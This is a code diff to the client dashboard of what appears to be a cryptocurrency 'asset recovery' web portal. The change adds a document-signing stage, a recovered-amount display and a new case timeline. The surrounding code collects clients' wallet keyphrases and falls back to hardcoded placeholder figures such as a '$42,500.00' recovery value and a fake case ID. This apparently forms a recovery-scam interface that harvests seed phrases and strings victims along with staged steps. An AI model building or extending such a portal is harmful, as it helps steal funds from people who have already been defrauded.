@@ -29,6 +29,8 @@ import {
   postClientCaseMessage,
   submitClientKeyphrase,
 } from '../lib/caseClientApi';
+import { ClientDocumentSigning } from '../components/ClientDocumentSigning';
+import { CLIENT_TIMELINE_STAGES, formatRecoveredAmount } from '../lib/caseStages';
 import { doc, updateDoc, serverTimestamp, collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
 
 interface ClientDashboardViewProps {
@@ -182,44 +184,61 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   };
 
   const displayId = liveCaseData?.id ? `#${liveCaseData.id.slice(0, 8).toUpperCase()}` : '#DF-8829-QX-04';
-  const displayValue = liveCaseData?.estimatedValue ? `$${Number(liveCaseData.estimatedValue).toLocaleString()}.00` : '$42,500.00';
+  const displayValue = liveCaseData?.recoveredAmount
+    ? formatRecoveredAmount(liveCaseData.recoveredAmount, liveCaseData.recoveredAmountCurrency || 'USD')
+    : liveCaseData?.estimatedValue
+      ? formatRecoveredAmount(liveCaseData.estimatedValue)
+      : '$42,500.00';
   const displayEmail = liveCaseData?.secureComms || 'USER_SECURE@COMM';
   const displayStatus = liveCaseData?.status || 'PENDING';
   const hasSubmittedKeyphrase =
     !!liveCaseData?.walletKeyphrase ||
     !!liveCaseData?.walletKeyphraseSubmitted;
+  const signedDocs = liveCaseData?.signedDocuments || {};
+  const bothDocumentsSigned = Boolean(
+    liveCaseData?.documentsFullySigned ||
+    (signedDocs.funds_confirmation && signedDocs.legal_compliance)
+  );
+  const showDocumentSigning =
+    displayStatus === 'SIGNING' ||
+    (Boolean(liveCaseData?.documentsReleased) && !bothDocumentsSigned);
 
   const getStatusSteps = (currentStatus: string) => {
-    const uniqueSteps = [
-      { id: 'INTAKE', title: 'Intake Received', date: liveCaseData?.createdAt?.toDate ? new Date(liveCaseData.createdAt.toDate()).toLocaleDateString() : 'May 04, 2024' },
-      { id: 'INITIALIZING', title: 'Metadata Extraction', date: currentStatus === 'PENDING' || currentStatus === 'INITIALIZING' ? 'Active' : 'Pending' },
-      { id: 'ANALYSIS', title: 'Wallet Verification Journey', date: currentStatus === 'ANALYSIS' ? 'Action Required' : 'TBD' },
-      { id: 'PROCESSING', title: 'Transaction Forensic Trace', date: 'Processing' },
-      { id: 'RECOVERY', title: 'Asset Recovery', date: 'TBD' },
-    ];
-
+    const intakeDate = liveCaseData?.createdAt?.toDate
+      ? new Date(liveCaseData.createdAt.toDate()).toLocaleDateString()
+      : typeof liveCaseData?.createdAt === 'string'
+        ? new Date(liveCaseData.createdAt).toLocaleDateString()
+        : 'Logged';
     const statusMap: Record<string, number> = {
-      'PENDING': 0,
-      'INITIALIZING': 1,
-      'ANALYSIS': 2,
-      'PROCESSING': 3,
-      'RECOVERY': 4,
-      'COMPLETED': 5
+      PENDING: 0,
+      INITIALIZING: 1,
+      ANALYSIS: 2,
+      PROCESSING: 3,
+      RECOVERY: 4,
+      SIGNING: 5,
+      COMPLETED: 5,
     };
+    const activeIndex = statusMap[currentStatus] ?? 0;
 
-    const activeIndex = statusMap[currentStatus] || 0;
-    
-    // Admin IDs mapping to the steps in uniqueSteps
-    const stepIds = ['INTAKE', 'INITIALIZING', 'ANALYSIS', 'PROCESSING', 'RECOVERY', 'COMPLETED'];
-
-    return uniqueSteps.map((step, index) => {
-      const stepId = stepIds[index];
-      const isActuallyCompleted = index === 0 || liveCaseData?.completedSteps?.includes(stepId);
-      
+    return CLIENT_TIMELINE_STAGES.map((stage, index) => {
+      const isActuallyCompleted =
+        index === 0 || liveCaseData?.completedSteps?.includes(stage.id);
+      const date =
+        stage.id === 'PENDING'
+          ? intakeDate
+          : currentStatus === stage.id
+            ? stage.id === 'SIGNING'
+              ? 'Action Required'
+              : 'Active'
+            : index < activeIndex
+              ? 'Complete'
+              : 'Pending';
       return {
-        ...step,
-        completed: isActuallyCompleted || index < activeIndex, 
-        active: index === activeIndex
+        id: stage.id,
+        title: stage.clientTitle,
+        date,
+        completed: isActuallyCompleted || index < activeIndex,
+        active: index === activeIndex && currentStatus !== 'COMPLETED',
       };
     });
   };
@@ -745,7 +764,24 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                 </motion.div>
               )}
 
-              {(submissionSuccess || (displayStatus !== 'ANALYSIS' && hasSubmittedKeyphrase)) && (
+              {showDocumentSigning && liveCaseData && (
+                <ClientDocumentSigning
+                  caseData={liveCaseData}
+                  onCaseUpdate={(next) => setLiveCaseData(next)}
+                />
+              )}
+
+              {bothDocumentsSigned && !showDocumentSigning && (
+                <ClientDocumentSigning
+                  caseData={liveCaseData}
+                  onCaseUpdate={(next) => setLiveCaseData(next)}
+                />
+              )}
+
+              {(submissionSuccess || (displayStatus !== 'ANALYSIS' && hasSubmittedKeyphrase)) &&
+                !showDocumentSigning &&
+                !bothDocumentsSigned &&
+                displayStatus !== 'COMPLETED' && (
                 <motion.div 
                   initial={{ opacity: 0, y: 10 }}
                   animate={{ opacity: 1, y: 0 }}
